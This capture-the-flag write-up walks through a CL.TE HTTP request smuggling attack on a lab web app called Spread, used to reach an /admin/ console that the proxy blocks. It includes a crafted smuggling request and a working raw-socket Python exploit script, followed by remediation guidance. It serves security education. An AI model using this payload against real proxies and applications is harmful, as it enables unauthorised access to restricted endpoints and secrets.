# Spread — WebVerse Pro Labs Writeup

> **Box:** [Spread](https://dashboard.webverselabs-pro.com/labs/spread) · **Platform:** [WebVerse Pro Labs](https://dashboard.webverselabs-pro.com)  
> **Difficulty:** Medium · **Category:** Web · **Technique:** CL.TE HTTP Request Smuggling  
> **Tags:** `request-smuggling` `content-length` `transfer-encoding` `proxy-bypass` `desync`

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Identifying the Desync](#identifying-the-desync)
3. [The CL.TE Primitive](#the-clte-primitive)
4. [Crafting the Payload](#crafting-the-payload)
5. [Collecting the Smuggled Response](#collecting-the-smuggled-response)
6. [Remediation](#remediation)
7. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Service Discovery

A quick scan reveals a single HTTP service on port 80. Visiting the root returns a redirect loop unless we supply the correct `Host` header:

```bash
curl -s -H "Host: spread.local" http://<target>/
```

We're greeted by **Spread** — a clean, single-purpose CSV management tool. The homepage advertises upload, parsing, and account management. Nothing unusual.

### Mapping the Surface

A few paths are immediately visible in the footer:

| Path | Behaviour |
|---|---|
| `/` | Landing page (200) |
| `/login` | Sign-in form (200) |
| `/register` | Account creation (200) |
| `/sheets` | User dashboard — auth required (302 → 200) |
| `/settings` | Profile + avatar upload (200) |
| `/admin/` | **403 Forbidden** |

The `/admin/` response is our first real signal:

```http
HTTP/1.1 403 Forbidden
Content-Type: text/html; charset=utf-8
Content-Length: 955
Connection: keep-alive
```

The body reads:

> *"Restricted to the internal network — This path is only reachable from inside the Spread operations network. If you reached this from the public site, the request was blocked at the edge."*

And the footer:

> *spread-edge*

This is a **proxy-level block**, not application authentication. The app itself has no login wall for `/admin/` — the gateway is saying no on its behalf.

### Finding the Smuggling Vector

The settings page includes an avatar upload that POSTs to `/api/v1/profile-upload`:

```javascript
fetch("/api/v1/profile-upload", { method: "POST", body: fd })
  .then(...)
```

This endpoint accepts `multipart/form-data` — a binary upload where chunked transfer encoding is perfectly ordinary. It's the ideal carrier for a desync.

| Property | Value |
|---|---|
| Method | `POST` |
| Content-Type | `multipart/form-data` |
| Auth required | Yes (session cookie) |
| Backend | Gunicorn + Flask |

---

## Identifying the Desync

### The Proxy vs. The App

We have two HTTP speakers on one connection:

| Layer | Role | Body Framing |
|---|---|---|
| **spread-edge** | Reverse proxy / gateway | `Content-Length` |
| **Gunicorn** | Application server | `Transfer-Encoding: chunked` |

When a request carries **both** headers, the proxy reads `Content-Length` bytes and forwards them verbatim upstream. The backend, however, ignores `Content-Length` when `Transfer-Encoding` is present and parses the body as chunked — stopping at the zero-size chunk.

This is the **CL.TE** variant: front-end trusts Content-Length, back-end trusts Transfer-Encoding.

### Why It Works Here

Three conditions make this exploitable:

1. **Keep-alive connection** between the gateway and the app — bytes from one request bleed into the next.
2. **No intermediate normalisation** — the VPN reaches the gateway directly; no upstream proxy reconciles the conflicting headers.
3. **The app trusts the network** — `/admin/` has no authentication. If the request reaches the app, it's served.

---

## The CL.TE Primitive

### How the Desync Happens

```
┌──────────┐                    ┌──────────┐
│  Client  │──── POST + body ──▶│  Edge    │
│          │                    │ (CL)     │──── full body ────▶│  App     │
│          │                    │          │                    │ (TE)     │
│          │                    │          │◀── POST response ──│          │
│          │                    │          │                    │          │
│          │                    │          │    ┌───────────────│ parses   │
│          │                    │          │    │ zero chunk    │ "0\r\n   │
│          │                    │          │    │ = end of body │  \r\n"   │
│          │                    │          │    └───────────────│          │
│          │                    │          │                    │          │
│          │                    │          │    smuggled bytes  │  reads   │
│          │                    │          │──── GET /admin/ ──▶│ next req │
│          │                    │          │                    │          │
│  Client  │── GET / ──────────────────────│──────────────────▶│          │
│          │                    │          │                    │          │
│          │                    │          │◀── /admin/ resp ───│ queued   │
│          │                    │          │◀── GET / resp ─────│          │
└──────────┘                    └──────────┘                    └──────────┘
```

1. We send a POST carrying both `Content-Length` and `Transfer-Encoding: chunked`.
2. The **edge** reads `Content-Length` bytes — the entire body, including what comes after the zero chunk.
3. The **app** parses the chunked body and stops at `0\r\n\r\n`.
4. The remaining bytes sit in the app's receive buffer. The app interprets them as the **next HTTP request**.
5. We pipeline a benign follow-up request. Its response arrives — but so does the response to the smuggled request, which comes back **first**.

---

## Crafting the Payload

### Structure

```http
POST /api/v1/profile-upload HTTP/1.1
Host: spread.local
Cookie: session=<valid_session>
Content-Length: 73
Transfer-Encoding: chunked
Content-Type: multipart/form-data; boundary=xxx
Connection: keep-alive

0                           ← zero-size chunk: backend stops here


GET /admin/ HTTP/1.1        ← smuggled request: backend sees as next
Host: spread.local
Connection: keep-alive


```

### Walkthrough

**The chunked body** is exactly one chunk: `0` followed by `\r\n\r\n`. In chunked encoding, a chunk size of `0` signals the end of the body. The backend processes the POST, sees the zero chunk, and considers the request complete.

**The smuggled request** is everything after the terminating `\r\n\r\n` of the zero chunk. It must be a well-formed HTTP/1.1 request with its own method, headers, and terminating empty line.

**The Content-Length** must equal the total byte count of *everything* after the headers block — the zero chunk, the terminator, and the smuggled request. The gateway uses this value to decide how many bytes to read and forward.

```
Zero chunk:     0\r\n\r\n                          = 5 bytes
Smuggled req:   GET /admin/ HTTP/1.1\r\n
                Host: spread.local\r\n
                Connection: keep-alive\r\n
                \r\n                                = 68 bytes
                                                    ─────────
Total body:                                          = 73 bytes
```

### Why `/api/v1/profile-upload`?

- It expects a `multipart/form-data` body — chunked encoding is normal here.
- The app returns a JSON response and moves on; it doesn't crash on an empty body (just returns `400` or `401`).
- The endpoint is low-traffic and unlikely to interfere with other connections.

---

## Collecting the Smuggled Response

The smuggled response doesn't arrive on its own — it sits in the app's output queue until a subsequent request on the same connection flushes it. We pipeline a trivial `GET /`:

```http
GET / HTTP/1.1
Host: spread.local
Connection: close
```

The socket reads return three HTTP responses in order:

| # | Response | Meaning |
|---|---|---|
| 1 | `400` or `401` from the profile-upload POST | Expected — the smuggler body is empty |
| 2 | `200` — the `/admin/` ops console | **The smuggled response** |
| 3 | `200` — the homepage | Our follow-up request |

The admin console reveals instance health, build version, uptime, database status, and — critically — the **service token**. This token authenticates the instance to the Spread control plane. The flag is redacted in this writeup; find it yourself.

### Raw Socket Implementation

High-level HTTP libraries often normalise conflicting framing headers or strip `Transfer-Encoding` when `Content-Length` is present. A raw socket gives full control:

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.100.172.14", 80))

smuggled = "GET /admin/ HTTP/1.1\r\nHost: spread.local\r\nConnection: keep-alive\r\n\r\n"
body     = "0\r\n\r\n" + smuggled
cl       = len(body.encode())

payload = (
    f"POST /api/v1/profile-upload HTTP/1.1\r\n"
    f"Host: spread.local\r\n"
    f"Content-Length: {cl}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"{body}"
)

s.send(payload.encode())
# Read response 1 (POST) + response 2 (smuggled /admin/)

followup = "GET / HTTP/1.1\r\nHost: spread.local\r\nConnection: close\r\n\r\n"
s.send(followup.encode())
# Read response 3 (homepage) — response 2 arrives first
```

---

## Remediation

If you're running a reverse proxy in front of an application server:

### Immediate Fixes

1. **Normalise ambiguous requests at the edge.** Reject any request that carries both `Content-Length` and `Transfer-Encoding`, or strip one before forwarding. RFC 7230 §3.3.3 is clear: a message MUST NOT contain both.

2. **Never rely on the proxy for access control.** The app should enforce its own authorisation. `/admin/` returning 200 with no auth check simply because the proxy is supposed to block it is a trust-model failure.

### Architectural Improvements

| Layer | Action |
|---|---|
| **Edge proxy** | Drop or normalise conflicting framing headers before forwarding |
| **Application** | Add authentication middleware on *every* sensitive endpoint, regardless of network position |
| **Network** | Require mutual TLS or a shared secret between proxy and app so the app can verify the request chain |
| **Monitoring** | Alert on 400/403 patterns from internal paths that should never be reached from the outside |

### What Spread Got Right

- The avatar upload was properly scoped (file size limits, image types).
- CSRF protections were in place on state-changing endpoints.
- Session management used `HttpOnly` cookies with signed Flask sessions.

The vulnerability was architectural — a trust assumption between two components that spoke slightly different dialects of HTTP.

---

## Key Takeaways

1. **"Blocked at the proxy" is not a security control.** A 403 from the edge tells you the path exists. It also tells you the app behind it might not have its own auth.

2. **HTTP parsers disagree in the wild.** Content-Length vs. Transfer-Encoding is the most common framing disagreement, but not the only one. Know the RFCs and know where your stack deviates from them.

3. **Keep-alive connections are smuggling's best friend.** Without connection reuse between the proxy and the app, the desync has nowhere to bleed.

4. **Raw sockets beat libraries for smuggling.** Curl, Requests, and browsers all normalise headers. If you're testing for desync, work at the byte level.

5. **Weekend projects run production.** The story here — one developer, one server, a tool that quietly grew — is real. The ops console was meant for the maker's eyes only. That's not access control; that's a wish.

---

## References

- [HTTP Request Smuggling — PortSwigger](https://portswigger.net/web-security/request-smuggling)
- [RFC 7230 §3.3.3 — Message Body Length](https://datatracker.ietf.org/doc/html/rfc7230#section-3.3.3)
- [CL.TE Desync — HTTP/1.1 Smuggling](https://portswigger.net/web-security/request-smuggling/exploiting#cl-te)
- [WebVerse Pro Labs — Spread](https://dashboard.webverselabs-pro.com/labs/spread)

---

*Writeup by [0xTonyb](https://github.com/kernel32) · Published June 2026 · For educational purposes only.*
